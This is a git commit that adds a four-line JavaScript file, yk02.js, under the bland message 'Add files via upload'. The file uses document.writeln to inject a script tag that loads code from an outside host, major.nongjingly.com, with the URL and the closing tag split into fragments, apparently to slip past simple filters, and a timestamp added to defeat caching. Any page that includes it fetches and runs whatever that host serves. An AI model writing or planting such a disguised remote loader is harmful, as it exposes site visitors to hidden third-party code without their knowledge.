53f70c83e5f3a2a8d09f490356fe0a8b9a142a80
jisucdn <79298333+jisucdn@users.noreply.github.com>
2021-09-22 23:41:21 +0800

    Add files via upload

---
+++ yk02.js
@@ -0,0 +1,4 @@
+document.writeln('<script id="EX8NDYGmQ2JpXxHkQYLuUV" src="ht')
+document.writeln('tps:')
+document.writeln('//major.nongjingly.com/142/EX8NDYGmQ2JpXxHkQYLuUV.shtml?'+new Date().getTime()+'"')
+document.writeln('><\/scr' + 'ipt>')
